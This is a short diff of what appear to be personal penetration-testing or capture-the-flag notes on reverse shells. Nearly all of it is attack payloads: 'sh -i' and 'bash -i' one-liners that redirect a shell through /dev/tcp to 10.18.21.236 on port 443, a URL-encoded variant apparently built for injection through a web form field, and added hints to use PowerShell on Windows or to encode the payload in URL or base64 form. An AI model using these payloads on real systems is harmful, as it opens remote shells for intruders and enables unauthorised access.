@@ -9,3 +9,6 @@ sh -i >& /dev/tcp/10.18.21.236/443 0>&1
 `bash -c "bash -i >& /dev/tcp/10.18.21.236/443 0>&1"`
 url encoded: `bash+-c+"bash+-i+>%26+/dev/tcp/10.18.21.236/443+0>%261"&sub=Execute`
 
+for windows, use [[powershell]]
+
+can also be encoded url, base64
